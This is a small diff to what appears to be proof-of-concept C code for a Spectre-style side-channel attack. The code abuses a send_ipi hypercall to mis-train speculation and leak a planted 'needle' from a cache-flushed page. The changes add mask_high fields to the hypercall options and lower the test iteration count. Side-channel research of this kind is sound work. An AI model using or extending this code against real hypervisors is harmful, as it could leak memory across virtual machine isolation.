@@ -55,8 +55,8 @@ size_t calculate_min(const uintptr_t phys_page_addr, const uintptr_t phys_map_ad
 }
 
 size_t access_buffer_with_spectre(void *buf, const size_t idx, const size_t iters, int set_idx) {
-  struct send_ipi_hypercall opts = {.real = {.mask_low = -1, .min = 0},
-                                    .mispredicted = {.mask_low = -1, .min = idx},
+  struct send_ipi_hypercall opts = {.real = {.mask_low = -1, .mask_high = -1, .min = 0},
+                                    .mispredicted = {.mask_low = -1, .mask_high = -1, .min = idx},
                                     .ptr = buf,
                                     .cache_set_idx = set_idx};
 
@@ -179,7 +179,7 @@ void cmd_test_spectre(int argc, char *argv[argc], void *leak_page) {
   memcpy(leak_page, needle, needle_size);
   clflush(leak_page);
 
-  const size_t iterations = 100000;
+  const size_t iterations = 10000;
   printf("Doing %ld iterations\n", iterations);
   for (int set_idx = 0; set_idx < 1; ++set_idx) {
 
